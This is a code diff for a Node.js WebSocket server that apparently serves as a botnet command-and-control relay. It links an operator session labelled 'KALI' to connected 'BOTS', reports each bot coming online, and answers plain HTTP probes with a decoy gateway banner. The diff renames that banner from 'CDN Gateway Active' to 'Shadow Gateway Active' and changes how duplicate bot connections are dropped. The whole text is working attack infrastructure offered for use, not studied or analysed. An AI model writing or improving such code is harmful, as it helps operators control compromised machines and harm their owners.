@@ -1,7 +1,7 @@
 const WebSocket = require('ws');
 const http = require('http');
 
-const server = http.createServer((_, r) => r.end('CDN Gateway Active'));
+const server = http.createServer((_, r) => r.end('Shadow Gateway Active'));
 const wss = new WebSocket.Server({ server });
 
 let KALI = null;
@@ -15,10 +15,9 @@ wss.on('connection', (ws, req) => {
         KALI = ws;
         BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
     } else {
-        // MÁGICA ANTI-DUPLICATA: Se o bot já existe, fecha a conexão velha
+        // Se o bot já existe, mata a conexão anterior para não duplicar
         if (BOTS.has(id)) {
             BOTS.get(id).terminate();
-            BOTS.delete(id);
         }
         BOTS.set(id, ws);
         if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id }));
